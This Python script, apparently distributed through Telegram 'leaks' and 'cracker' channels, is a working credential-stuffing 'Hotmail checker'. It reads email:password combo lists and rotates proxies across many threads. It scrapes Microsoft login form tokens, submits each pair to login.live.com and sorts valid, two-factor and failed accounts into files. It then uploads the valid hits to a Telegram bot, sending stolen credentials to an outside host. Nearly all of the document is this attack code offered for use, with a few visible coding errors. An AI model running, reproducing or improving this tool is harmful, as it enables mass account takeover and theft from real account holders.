#  https://t.me/+QWRoc1op3xYxMWU9
# LEAKS CLOUD/FREE TOOLS / FREE PROXY / FREE TOOLS CRACKER
# Zotac Cl0ud : https://t.me/+RNDcmnZziiplMDI9


import requests
import re
import urllib.parse
import threading
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table

stats = {
    "checked": 0,
    "hits": 0,
    "bad": 0,
    "start_time": time.time()
}
lock = threading.Lock()
console = Console()

def update_stat(key):
    with lock:
        stats[key] += 1
        stats["checked"] += 1

def elapsed_time():
    seconds = int(time.time() - stats["start_time"])
    return time.strftime("%Hh%Mm%Ss", time.gmtime(seconds))

def print_stats(total, proxy_count, threads):
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Total Combos", style="bold")
    table.add_column("Proxy", style="cyan")
    table.add_column("Checked", justify="center")
    table.add_column("Hits", style="green", justify="center")
    table.add_column("Bad", style="red", justify="center")
    table.add_column("CPM", style="bright_cyan", justify="center")
    table.add_column("Threads", style="bright_white", justify="center")
    table.add_column("Time", style="dim", justify="center")

    elapsed = time.time() - stats["start_time"]
    cpm = int(stats["checked"] / elapsed * 60) if elapsed > 0 else 0

    table.add_row(
        str(total),
        str(proxy_count),
        f"{stats['checked']}/{total}",
        str(stats["hits"]),
        str(stats["bad"]),
        str(cpm),
        str(threads),
        elapsed_time()
    )
    console.clear()
    console.print(table)

def load_proxies(proxy_file):
    try:
        with open(proxy_file, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if ':' in line]
    except Exception as e:
        print(f"[!] Proxy file lỗi: {e}")
        return []

def get_random_proxy(proxies):
    if not proxies:
        return None
    proxy_line = random.choice(proxies)
    parts = proxy_line.split(":")
    if len(parts) == 2:
        ip, port = parts
        proxy = f"http://{ip}:{port}"
    elif len(parts) == 4:
        ip, port, user, pwd = parts
        proxy = f"http://{user}:{pwd}@{ip}:{port}"
    else:
        return None
    return {
        "http": proxy,
        "https": proxy
    }

headers_base = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

def get_initial_data(session, proxies):
    try:
        proxy = get_random_proxy(proxies)
        r = session.get("https://outlook.live.com/owa/?nlp=1", headers=headers_base, timeout=15, proxies=proxy)
        html = r.text
        addr_match = re.search(r'https://login\.live\.com/login\.srf[^"]*', html)
        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', html)
        post_srf_url = re.search(r'https://login\.live\.com/ppsecure/post\.srf[^\'"]*', html)

        if not (addr_match and ppft_match and post_srf_url):
            return None

        return {
            "ref": addr_match.group(0),
            "flow": ppft_match.group(1),
            "post_url": post_srf_url.group(0),
            "proxy": proxy
        }
    except:
        return None

def check(email, password, proxies):
    try:
        session = requests.Session()
        init = get_initial_data(session, proxies)
        if not init:
            return  

        payload = {
            "i13": "0",
            "login": email,
            "loginfmt": email,
            "type": "11",
            "LoginOptions": "3",
            "passwd": password,
            "ps": "2",
            "PPFT": init["flow"],
            "PPSX": "Pa",
            "NewUser": "1",
            "FoundMSAs": "",
            "fspost": "0",
            "i21": "0",
            "CookieDisclosure": "0",
            "IsFidoSupported": "1",
            "isSignupPost": "0",
            "i2": "1",
            "i17": "0",
            "i18": "",
            "i19": "1168400"
        }

        headers_post = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://login.live.com",
            "Referer": init["ref"],
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0"
        }

        r = session.post(init["post_url"], data=payload, headers=headers_post, allow_redirects=False, timeout=15, proxies=init["proxy"])
        text = r.text.lower()

        if any(x in text for x in ["two-step verification", "2-step verification", "security code"]):
            update_stat("bad")
            with lock:
                with open("2fa.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
        elif any(x in text for x in ["doesn't exist", "incorrect", "too many times", "invalid", "password was incorrect"]):
            update_stat("bad")
            with lock:
                with open("bad.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
        elif any(x in text for x in ["wlssc", "anon", "signinname", "id=\"fmHF\""]):
            update_stat("hits")
            with lock:
                with open("hits.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
        else:
            update_stat("bad")
            with lock:
                with open("unknown_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")

    except:
        pass  

def send_telegram_file(token, chat_id, file_path):
    url = f"https://api.telegram.org/bot{token}/sendDocument"
    with open(file_path, "rb") as file:
        files = {"document": file}
        params = {"chat_id": chat_id}
        response = requests.post(url, data=params, files=files)
    if response.status_code == 200:
        console.print(f"[Green] sent file {file_path} to telegram [/green]")
    else:
        console.print(f"[Red] Error {file_path}: {Response.text} [/Red]")

def load_config(config_file):
    try:
        if not os.path.exists(config_file):
            return None, None
        with open(config_file, "r", encoding="utf-8") as f:
            config = {}
            for line in f:
                line = line.strip()
                if "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
            token = config.get("token")
            chat_id = config.get("id")
            return token, chat_id
    except Exception as e:
        print(f"[!] Error reading config.txt: {e}")
        return None, None

def main():
    config_file = "config.txt"
    token, chat_id = load_config(config_file)
    if not token or not chat_id:
        print("[!] No token or ID found in config.txt")
        return

    os.system("cls" if os.name == "nt" else "clear")
    print(f"""
                \x1b[38;2;255;255;255m┌──────────────────────────────────────────────────┐
                \x1b[38;2;255;255;255m│                                                  │
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m██╗   ██╗ ██████╗ ██╗  ██╗           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m██║   ██║██╔════╝ ██║  ██║           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m██║   ██║██║  ███╗███████║           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m██║   ██║██║   ██║██╔══██║           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m╚██████╔╝╚██████╔╝██║  ██║           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│             \x1b[38;2;164;12;247m ╚═════╝  ╚═════╝ ╚═╝  ╚═╝           \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│──────────────────────────────────────────────────│
                \x1b[38;2;255;255;255m│ \x1b[38;2;164;12;247mHotmail checker \x1b[38;2;164;12;247m[ \x1b[38;2;255;255;255mPRIVATE \x1b[38;2;255;255;255mTOOLS \x1b[38;2;164;12;247m]                \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│ \x1b[38;2;164;12;247mID \x1b[38;2;255;255;255m: 10389290403                                 \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m│ \x1b[38;2;164;12;247mDEV \x1b[38;2;255;255;255m: t.me/datvuluckkystop                       \x1b[38;2;255;255;255m│
                \x1b[38;2;255;255;255m└──────────────────────────────────────────────────┘
          """)

    combo_file = input("Combo hotmail: ").strip()
    proxy_file = input("Proxy: ").strip()
    threads = int(input("Threads (default 50): ") or "50")

    try:
        with open(combo_file, "r", encoding="utf-8") as f:
            combos = [line.strip() for line in f if ':' in line]
    except Exception as e:
        print(f"[!] Combo error reading error: {e}")
        return

    proxies = load_proxies(proxy_file)
    total = len(combos)

    print (f "\ n🔁 is running {total} combo with {threads} threads ... \ n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check, *line.split(":", 1), proxies) for line in combos]

        while any(not f.done() for f in futures):
            print_stats(total, len(proxies), threads)
            time.sleep(1)

    print_stats(total, len(proxies), threads)
    print(f"\n✅ DONE | HITS: {stats['hits']} | BAD: {stats['bad']}")
    
    if stats["hits"] > 0 and os.path.exists("hits.txt"):
        send_telegram_file(token, chat_id, "hits.txt")

if __name__ == "__main__":
    main()
